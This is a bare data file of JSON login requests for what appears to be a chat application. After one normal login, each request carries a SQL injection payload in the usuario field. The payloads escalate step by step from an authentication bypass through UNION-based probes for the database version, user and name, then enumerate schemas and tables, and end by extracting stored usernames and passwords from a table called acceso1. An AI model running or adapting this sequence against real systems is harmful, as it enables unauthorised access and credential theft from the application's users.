{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "%' or '0'=0 -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono' or '1'='1' -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono' UNION SELECT 1, 2, 3, 4, 5, 6, 7, @@version -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "%' or '0'=0 UNION SELECT 1,2,3,4,5,6, NULL, version() # -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "%' or '0'=0 UNION SELECT 1,2,3,4,5,6, NULL, user() # -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "%' or '0'=0 UNION SELECT 1,2,3,4,5,6, NULL, database() # -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono' UNION SELECT 1, 2, 3, 4, 5, 6, 7, schema_name from information_schema.schemata -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono'UNION SELECT 1, 2, 3, 4, 5, 6, table_name, 2 from information_schema.tables -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono'UNION SELECT 1, 2, 3, 4, 5, 6, table_name, 2 from information_schema.tables where table_schema='chat' -- ",
    "clave": "123"
}

{
    "gestion": "in",
    "token": "null",
    "usuario": "manuel.dono' UNION SELECT 1, 2, 3, 4, 5, 6,usuario, clave from acceso1 -- ",
    "clave": "123"
}